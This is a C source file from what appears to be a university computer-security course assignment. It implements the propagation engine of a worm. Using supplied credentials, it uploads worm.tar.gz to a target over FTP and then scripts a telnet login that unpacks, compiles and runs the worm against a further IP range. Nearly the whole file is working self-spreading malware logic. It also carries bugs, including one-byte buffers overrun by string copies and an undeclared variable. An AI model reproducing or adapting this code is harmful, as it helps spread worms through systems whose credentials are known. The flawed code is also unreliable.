//-------------------------------------------------------------------//
// UNIVERSIDADE FEDERAL DO PARANÁ                                    //
// HENRIQUE HEPP						     //
// KATHERYNE LOUISE GRAF     					     //
// CI301 - INTRODUÇÃO À SEGURANÇA COMPUTACIONAL                      //
//-------------------------------------------------------------------//
// BIBLIOTECAS
//-------------------------------------------------------------------//
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <termios.h>
#include <fcntl.h>
#include <arpa/inet.h>
//-------------------------------------------------------------------//
// FUNÇÕES
//-------------------------------------------------------------------//
// Função que transforma um inteiro em char
// É dependente da base do inteiro, para efetuar a conversão correta

char* intTochar(int val, int base){
	static char buf[32] = {0};
	int i = 30;
	
	for(; val && i ; --i, val /= base)
		buf[i] = "0123456789abcdef"[val % base];
	
	return &buf[i+1];
}
//-------------------------------------------------------------------//
// Esta função pega os números passados no PASV e transforma em ip
// e porta, para fazer a nova conexão para envio de dados

void parseIPPort(char buffer[], char *ip, int *port){
    char *token = (char*) malloc(sizeof(char));
    char *aux = (char*) malloc(sizeof(char));
    char *aux2 = (char*) malloc(sizeof(char));
    char *ip_aux = (char*) malloc(sizeof(char));
    char **range = malloc(2*sizeof(char *));
    char *ponto = ".";
    int i = 0, p1 = 0, p2 = 0;
    
    token = strtok(buffer, " ");
   
    while(token != NULL) {
        aux = token;
        token = strtok(NULL, " ");
    }
 
    token = strtok(aux, "(");
    aux2 = strdup(token);
    token = strtok(aux2, ")");
    aux = strdup(token);
    
    token = strtok(aux, ",");
   
    while(token != NULL) {
        range[i] = token;
        token = strtok(NULL, ",");
        i +=1;
    }

    for(i = 0; i < 3; i++){
        strcpy(ip_aux, range[i]);
        strcat(ip_aux, ponto);
        strcat(ip, ip_aux);
    }
    
    strcpy(ip_aux, range[i]);
    strcat(ip, ip_aux);

    p1 = atoi(range[i+1]);
    p2 = atoi(range[i+2]);

    *port = p1*256+p2;
}
//-------------------------------------------------------------------//
// Esta função faz uma comunicação FTP via Socket, loga no computador
// de forma remota e faz a transferencia do aruivo worm.tar.gz
// que contem todos os arquivos do worm.

void fileTransfer(char *ip, char *username, char *password){
    char buffer[1024];
    char *ipT = (char*) malloc(sizeof(char));
    char user[100] = "USER ";
    char pass[100] = "PASS ";
    char model[10] = "MODE C\n";
    char type[10] = "TYPE I\n";
    char stru[10] = "STRU F\n";
    char pasv[10] = "PASV\n";
    char cwd[100] = "CWD /home/";
    char cwdWD[100] = "CWD Asgn03KLG/\n";
    char pwd[10] = "PWD\n";
    char mkd[20] = "MKD Asgn03KLG\n";
    char quit[10] = "QUIT\n";
    char stor[20] = "STOR worm.tar.gz\n";
    char file[20] = "worm.tar.gz";
    int sent, sock = 0, sockT = 0, percent = 0, port = 0, accept_socket, fileSize = 0;
    off_t offset = 0; //file offset
    struct sockaddr_in serverAddr, transfSock;
    struct stat obj;

    printf("====================================\n");
    printf("Executando FTP");
    printf("\n====================================\n");
    
    //CONNECT FTP
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        printf("Erro ao criar o socket.\n");
        exit(1);
    }  

    memset(&serverAddr, '0', sizeof(serverAddr));
    serverAddr.sin_addr.s_addr = inet_addr(ip);
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(21);

    printf("Conectando:\n");
    if(connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0){
        printf("Erro: conexao falhou. \n");
        exit(1);
    }
    
    //Resposta do Connect
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);

    printf("\nEnviando usuario: %s\n",username);
    //Enviando nome do usuario
    memset(buffer, '0', 1024);
    strcat(user, username);    
    strcat(user, "\n");    
    if(send(sock, user, strlen(user), 0) < 0){
        printf("Erro: nome do usuario invalido ou incorreto. \n");
        exit(1);    
    }

    //Resposta do nome do usuario
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);

    printf("\nEnviando senha: %s\n",password);
    //Enviando senha
    memset(buffer, '0', 1024);
    strcat(pass, password);
    strcat(pass, "\n");
    if(send(sock, pass, strlen(pass), 0) < 0){
        printf("Erro: senha invalida \n");
        exit(1);
    } 

    //Resposta da Senha
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);

    printf("\nEnviando Modo de Transferencia: Stream\n");
    //Enviando Modo de Transferencia: Stream
    memset(buffer, '0', 1024);
    send(sock, model, strlen(model), 0);

    //Resposta do Modo
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);
 
    printf("\nEnviando Tipo de Transferencia: Binario\n");
    //Enviando Tipo de Transferencia: Binario
    memset(buffer, '0', 1024);
    send(sock, type, strlen(type), 0);
    
    //Resposta do Tipo
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);

    printf("\nEnviando Tipo de Estrutura de Dados: F\n");
    //Enviando Estrutura de Dados: F
    memset(buffer, '0', 1024);
    send(sock, stru, strlen(stru), 0);
    
    //Resposta da Estrutura de Dados
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);

    printf("\nEnviando Passive Mode\n");
    //Enviando Passive Mode'
    memset(buffer, '0', 1024);
    send(sock, pasv, strlen(pasv), 0);

    //Resposta do Passive Mode
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);

    //Parse para pegar IP e Porta
    parseIPPort(buffer, ipT, &port);

    printf("\nEnviando cwd %s\n",username);
    //Enviando comando 'CD'
    memset(buffer, '0', 1024);
    strcat(cwd, username);
    strcat(cwd, "\n");
    send(sock, cwd, strlen(cwd), 0);
    
    //Resposta do 'CD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);
    
    printf("\nEnviando pwd\n");
    //Enviando comando 'PWD'
    memset(buffer, '0', 1024);
    send(sock, pwd, strlen(pwd), 0);
    
    //Resposta do 'PWD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);

    printf("\nEnviando %s",mkd);
    //Enviando comando 'MKD'
    memset(buffer, '0', 1024);
    send(sock, mkd, strlen(mkd), 0);
    
    //Resposta do 'MKD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);

    printf("\nEnviando %s",cwdWD);
    //Enviando comando 'CD'
    memset(buffer, '0', 1024);
    send(sock, cwdWD, strlen(cwdWD), 0);
    
    //Resposta do 'CD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);
    
    printf("\nEnviando %s",pwd);
    //Enviando comando 'PWD'
    memset(buffer, '0', 1024);
    send(sock, pwd, strlen(pwd), 0);
    
    //Resposta do 'PWD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);
    
    printf("\nEnviando %s",stor);
    //Enviando comando STRO
    memset(buffer, '0', 1024);
    send(sock, stor, strlen(stor), 0);

    printf("Transmitindo arquivos\n");
    
    //CONNECT FTP
    sockT = socket(AF_INET, SOCK_STREAM, 0);
    if(sockT < 0){
        perror("");
        exit(1);
    }  

    memset(&transfSock, '0', sizeof(transfSock));
    transfSock.sin_addr.s_addr = inet_addr(ipT);
    transfSock.sin_family = AF_INET;
    transfSock.sin_port = htons(port);

    if(connect(sockT, (struct sockaddr*)&transfSock, sizeof(transfSock)) < 0){
         perror("");
         exit(1);
    }
  
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);

    sent = open(file, O_RDONLY);

    if(sent < 0){
        printf("Arquivo não encontrado\n");
        exit(0);
    }
        
    //get size of file
    fstat(sent, &obj);
    
    offset = 0;
    percent =  sendfile(sockT, sent, &offset, obj.st_size);
    if(percent < 0){ 
        printf("Não foi possivel fazer a transferencia\n");
        exit(1);
    }

    if (percent != obj.st_size) {
        printf("Transferencia incompleta: %d de %d bytes\n", percent, (int)obj.st_size);
        exit(1);
    }
    
    close(sent);  
    close(sockT);

    //Resposta do 'STOR'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp stor: %s", buffer);
    
    printf("\nEnviando exit\n");
    //Enviando comando 'QUIT'
    memset(buffer, '0', 1024);
    send(sock, quit, strlen(quit), 0);
    
    //Resposta do 'QUIT'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);

    if(sock >= 0){
        close(sock);
    }
}
//-------------------------------------------------------------------//
// Esta função chama o TELNET, e usando o usuario e senha, loga no 
// sistema remotamente, entra dentro da pasta que contem os arquivos
// do worm, descompacta e executa mediante ao range de ip que 
// foi passado anteriormente, na primeira execução

void fileExecute(char *ip, char *username, char *pass, char range_ipSeq[], char range_portSeq[], int lenKey){
    char buff[1024];
    char ips[100];
    char *tamKey;
    FILE *file;
    pid_t child; // note that the actual return type of fork is 
             // pid_t, though it's probably just an int typedef'd or macro'd

    tamKey = intTochar(lenKey,10);
    printf("====================================\n");
    printf("Executando Telnet");
    printf("\n====================================\n");


    child = vfork();
    if (child == -1){
         perror("Fork failed");
    }
    else if (child == 0){
        //abrir conexão
        memset(buff, '0', 1024);
        strcpy(buff, "telnet ");
        strcat(buff, ip);
        strcat(buff, " 23");
        file = popen(buff, "w");
        if(file == NULL){
            perror("");
        }
        
        //login
        fflush(file);
        sleep(2); 
        memset(buff, '0', 1024);
        strcpy(buff, username);
        strcat(buff, "\n");
        fprintf(file, "%s", buff);
        
        //pass
        fflush(file);
        sleep(2);
        memset(buff, '0', 1024);
        strcpy(buff, pass);
        strcat(buff, "\n");
        fprintf(file, "%s", buff);
        
        //pwd
        fflush(file);
        sleep(2);
        fprintf(file, "pwd\n");
        
        //cd
        fflush(file);
        sleep(2);
        memset(buff, '0', 1024);
        strcpy(buff, "cd /home/");
        strcat(buff, username);
        strcat(buff,"/Asgn03KLG\n");
        fprintf(file, "%s", buff);
        
        //descompactar
        fflush(file);
        sleep(2);
        fprintf(file, "tar -vzxf worm.tar.gz\n");
        
        //make
        fflush(file);
        sleep(2);
        fprintf(file, "make\n");
        
        //execute
        fflush(file);
        sleep(2);
        memset(buff, '0', 1024);
        strcpy(buff, "./worm ");
        strcat(buff, range_ipSeq);
        strcat(buff," ");
        strcat(buff, range_ipPort);
        strcat(buff," ");
        strcat(buff, tamKey);
        strcat(buff,"\n");
        fprintf(file, "%s", buff);
        
        //exit
        fflush(file);
        sleep(2);
        fprintf(file, "exit\n");
        
        sleep(100);
        pclose(file);
        _exit(23);
    }

}
//-------------------------------------------------------------------//
// Esta função é o "main" da propagation, sua tarefa é fazer a chamada
// das funções responsaveis pelo envio e propagaçaõ dos dados.

void propagation_engine(char* ip, char *username, char *pass, char range_ipSeq[], char range_portSeq[], int lenKey){        
    printf("\n******************************************\n");
    printf("Transferindo o worm\n");
    fileTransfer(ip, username, pass);
    printf("\n******************************************\n");
    printf("Executando o worm\n");
    fileExecute(ip, username, pass, range_ipSeq, range_portSeq, lenKey);
    printf("\n******************************************\n");
}
//-------------------------------------------------------------------//
